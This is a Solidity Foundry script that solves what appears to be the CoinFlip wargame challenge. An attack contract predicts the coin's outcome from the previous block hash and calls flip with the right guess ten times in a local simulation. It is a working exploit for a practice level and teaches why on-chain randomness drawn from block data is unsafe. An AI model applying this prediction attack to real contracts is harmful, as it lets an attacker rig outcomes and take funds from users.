// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipSolution is Script {
    // $ forge script script/CoinFlip.s.sol --tc CoinFlipSolution

    function run() external {
        CoinFlip coinFlipInstance = new CoinFlip();
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        // ---- Attack Starts From here ---

        // - In the contract the guess is determined using the previous hash of the block.
        // - Since all the info in the blockchain is public, the numbers are used to determine the right guess.
        // - We will deploy a contract that has a function `attack`, which calculates the right guess, then calls `flip` function.
        // - every time we run `attack` function, we will first `flip` with the right guess, so `consecutiveWins` will increase by 1
        // - Repeat calling attack till you reach 10.

        vm.startPrank(attacker);
        CoinFlipAttack attackContract = new CoinFlipAttack(address(coinFlipInstance));
        console.log("CoinFlipAttack address:", address(attackContract));

        console.log("consecutiveWins:", coinFlipInstance.consecutiveWins());

        for (uint256 i = 0; i < 10; i++) {
            // Starts from block.number = 10
            // And, increasing the block.number by 1 each iteration
            // NOTE: this is to pass `lastHash == blockValue` check in the `CoinFlip` Contract.
            // In real networks, you fire a function, wait for the block confirmation, then fire it again.
            vm.roll(10 + i); // block.number = 10 + i
            attackContract.attack();
        }

        console.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        vm.stopPrank();
    }
}

contract CoinFlipAttack {
    CoinFlip coinFlipInstance;

    constructor(address target) {
        coinFlipInstance = CoinFlip(target);
    }

    // We will calculate the right guess, then we will call `flip` with the right value we got
    function attack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}
